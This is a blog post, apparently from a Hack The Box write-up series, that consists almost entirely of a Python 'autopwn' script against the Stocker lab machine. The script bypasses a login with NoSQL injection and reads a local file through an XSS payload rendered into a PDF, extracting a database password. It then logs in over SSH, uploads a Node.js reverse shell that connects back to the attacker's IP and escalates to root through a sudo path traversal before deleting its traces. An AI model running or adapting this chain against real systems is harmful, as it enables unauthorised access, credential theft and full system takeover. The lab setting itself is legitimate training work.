---
title: Stocker Autopwn
date: 2023-04-23 16:53:30 pm
categories: [HTB]
tags: [HTB, Linux, Easy, Python Scripting, NoSQLI, XSS, Path Traversal]

img_path: /assets/img/htb/writeups/stocker
---

# Python Script

* * *

With the script you gain full access to machine:

```python
#!/usr/bin/env python3

"""
Stocker Autopwn
----------------
Author: Marss
Date: 24 Apr, 2022
"""

from argparse import ArgumentParser, RawDescriptionHelpFormatter
from paramiko import SSHClient, AutoAddPolicy
from pwn import *
from PyPDF2 import PdfReader
from re import findall
from requests import Session, Request, get
from signal import signal, SIGINT

# Ctrl + c
# (function)
def signal_handler(signum, frame):
	exit('\n[!] User terminated.')

# (signal)
signal(SIGINT, signal_handler)

# Main class
class Exploit:

	def __init__(self, args):
		self.args = args

		self.target_host = {
			'ip_address' : '10.10.11.196',
			'domain_url' : 'stocker.htb',
			'subdomain_url' : 'dev.stocker.htb',
			'credentials': {'user': 'angoose', 'pass': None}
		}

		self.session = Session()

		#self.proxies = {'http': 'http://127.1:8080'}

	def run(self):
		"""
		Exploit process
		---------------
		(1) Bypass login panel (NoSQL injection)
		(2) Read local files (Server Side XSS [Dynamic PDF])
		(3) Privilege command execution (Path Traversal by Wildcard)
		"""
		print('[*] Starting attack....')
		print('[*] Bypassing login panel in {}'.format(self.target_host['subdomain_url']))
		self.bypass_login_panel()
		print('[*] Inyecting XSS payload: Target file -> index.js')
		self.read_local_files()
		print('[+] Creating and uploading Javascript Reverse Shell to target...')
		self.privilege_rce()

	def bypass_login_panel(self):

		try:
			headers = {'Content-Type': 'application/json'}
			post_data = {
				'username': {'$ne': 'null'},
				'password': {'$ne': 'null'}
			}

			req = Request('POST', 'http://' + self.target_host['subdomain_url'] + '/login',
				headers=headers,
				json=post_data)
			prepare_request = self.session.prepare_request(req)
			
			response = self.session.send(prepare_request)

		except Exception as error:
			exit('\n[x] Error: ' + repr(error))

	def read_local_files(self):
		
		try:
			file_to_read = '/var/www/dev/index.js'
			cmd_injection = """<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open('GET','file://%s');x.send();</script>""" % file_to_read

			post_data = {
				'basket': [
					{
						'_id': '638f116eeb060210cbd83a8d',
						'title': '{}'.format(cmd_injection),
						'description': 'It\'s a red cup',
						'image': 'red-cup.jpg',
						'price': 32,
						'currentStock': 4,
						'__v': 0,
						'amount': 1
					}
				]
			}

			req = Request('POST', 'http://' + self.target_host['subdomain_url'] + '/api/order',
				json=post_data)
			prepare_request = self.session.prepare_request(req)

			response = self.session.send(prepare_request)
			order_id = findall(r'"orderId":"(.*?)"', response.text)[0]

			self.get_angoose_password(order_id)
			
		except Exception as error:
			exit('\n[x] Error: ' + repr(error))

	def get_angoose_password(self, order_id: str):

		req = Request('GET', 'http://' + self.target_host['subdomain_url'] + f'/api/po/{order_id}')
		prepare_request = self.session.prepare_request(req)

		response = self.session.send(prepare_request)
		
		# download pdf
		leaked_data_file = 'leaked_data.pdf'
		print(f'[*] Downloading PDF -> {leaked_data_file}')
		with open(leaked_data_file, 'wb') as file:
			file.write(response.content)
		
		print(f'[*] Extracting credentials of {leaked_data_file}...')
		# extract readable data
		reader = PdfReader(leaked_data_file)
		file_data = reader.pages[0].extract_text()
		
		# extract angoose password
		self.target_host['credentials']['pass'] = findall(r'dbURI =\n".*?://.*?:(.*?)@.*?";',file_data)[0]
		print('[+] Credentials -> {}'.format(self.target_host['credentials']))

	def privilege_rce(self):

		try:
			_user = self.target_host['credentials']['user']
			_pass = self.target_host['credentials']['pass']
			
			ssh_client = self.ssh_connection(_user, _pass)

			# create workstation
			ssh_client.exec_command('mkdir -p /tmp/.{}'.format(self.args.ip))

			# create and upload malicious file
			file_name = 'rev_shell.js'
			content_file = """const { exec } = require('child_process');\nexec("bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'", (error, stdout, stderr) => {if (error) {console.error(`exec error: ${error}`); return;}});""" % (self.args.ip, self.args.port)

			with open(file_name, 'wt') as file:
				file.write(content_file)
			print(f'[+] Reverse Shell File created -> {file_name}')
			
			self.upload_file(ssh_client, file_name)
			print('[+] File uploaded to target -> /tmp/.{}/{}'.format(self.target_host['ip_address'], file_name))
			
			print('[*] Exploiting Path traversal to receive privilege shell...')
			# execute reverse shell with path traversal bypass
			command = 'echo {} | sudo -S /usr/bin/node /usr/local/scripts/../../../tmp/.{}/{}'.format(self.target_host['credentials']['pass'] ,self.args.ip, file_name)
			ssh_client.exec_command(command)
			
			# receive privilege shell
			shell = listen(self.args.port, timeout=20).wait_for_connection()

			if shell.sock:
				print('[!] Press Ctrl + D to exit.')
				shell.interactive()

			# remove workstation
			print('[-] Clearing tracks...')
			ssh_client.exec_command(f'rm -r /tmp/.{self.args.ip}')

			# close ssh connection
			ssh_client.close()

		except Exception as error:
			exit('\n[x] Error: ' + repr(error))

	def upload_file(self, ssh_client, file_name):
		with ssh_client.open_sftp() as sftp_client:
			sftp_client.put(file_name, '/tmp/.{}/{}'.format(self.args.ip, file_name))

	def ssh_connection(self, username: str, password: str):

		try:
			ssh_client = SSHClient()
			ssh_client.set_missing_host_key_policy(AutoAddPolicy())
			ssh_client.connect(self.target_host['ip_address'],
				port=22,
				username=username,
				password=password)

			return ssh_client

		except Exception as error:
			exit('\n[x] Error: ' + repr(error))

# Main Flow
if __name__ == '__main__':

	ascii_title="""
	____ ___ ____ ____ _  _ ____ ____    ____ _  _ ___ ____ _ _ _ ___  _  _ 
	[__   |  |  | |    |_/  |___ |__/    |__| |  |  |  |  | | | | |__] |\ | 
	___]  |  |__| |___ | \_ |___ |  \    |  | |__|  |  |__| |_|_| |    | \|

																	  by marss
	"""

	parser = ArgumentParser(
		formatter_class=RawDescriptionHelpFormatter,
		epilog="Example:\n\n python3 autopwn.py -i 10.10.10.10 -p 5555")

	parser.add_argument('-i', '--ip', type=str, required=True, help="Specified ip to receive the shell")
	parser.add_argument('-p', '--port', type=int, required=True, help="Specified port to receive the shell")

	args = parser.parse_args()

	print(ascii_title)

	exploit = Exploit(args)
	exploit.run()
```

## PoC

* * *

![PoC](PoC.png){: .shadow}

> Puedes encontrar el script y sus requerimientos en mi repositorio: [https://github.com/E1P0TR0](https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Autopwn_Stocker)
{: .prompt-info}